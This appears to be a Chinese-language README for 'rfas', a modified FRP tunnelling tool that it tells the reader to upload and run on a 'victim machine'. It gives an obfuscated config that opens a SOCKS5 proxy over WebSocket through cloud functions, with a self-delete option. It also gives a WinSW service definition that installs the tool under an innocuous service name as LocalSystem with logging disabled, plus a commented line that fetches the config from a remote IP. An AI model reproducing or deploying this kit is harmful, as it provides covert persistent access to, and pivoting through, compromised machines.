# rfas
FRP采用云函数+TLS加密，采用Websocket通信，配置文件也做了加密

将压缩包上传到受害者机器，解压，运行

这里注意的一点是run.xml是run.exe的配置文件，用来定义自启服务的配置，文件名要和配置文件名字统一

zz是frp的配置文件

如果不想做流量加密，将f3p.exe替换为正常的frp文件即可，配置文件同理

尖括号<>里为参数说明，正式使用请删除

zz
```
[common]
n2PvV = service-xxxxxx.xxxx.bj.apigw.tencentcs.com <wss服务地址>
05ZBz = 443 <wss服务端口>
tx06L = qax!@#123 <连接服务器的token>
9XiEV = wss <WebSocket协议>
zSYqj = true
fV0yw = service-xxxxxx.xxxx.bj.apigw.tencentcs.com <wss服务地址>
LYn04 = false <是否自删除配置文件>

[plugin_socks55]
N4DCJ = tcp
aQmFn = 8999 <remote_port>
oAZdB = true
aYpEk = true
umsUv = socks5 <协议>
```
run.xml
```
<service>
    <id>AppMgemt</id>
    <name>AppMgemt</name>
    <description></description>
    <!--
    <download from="http://x.x.x.x/<frp配置文件>" to="%BASE%\zz" />
    !-->
    <executable>"%BASE%\f3p.exe"</executable>
    <arguments></arguments>
    <serviceaccount>
      <username>LocalSystem</username>
     <!--
       <username>NT AUTHORITY\SYSTEM</username>
     !-->
    </serviceaccount>
    <log mode="none"/>
</service>
```
run.exe install & run.exe start

<img width="864" alt="image" src="https://user-images.githubusercontent.com/26845888/153735306-d161b493-caa0-4a43-8422-947ffbdea34e.png">

扩展：https://github.com/winsw/winsw
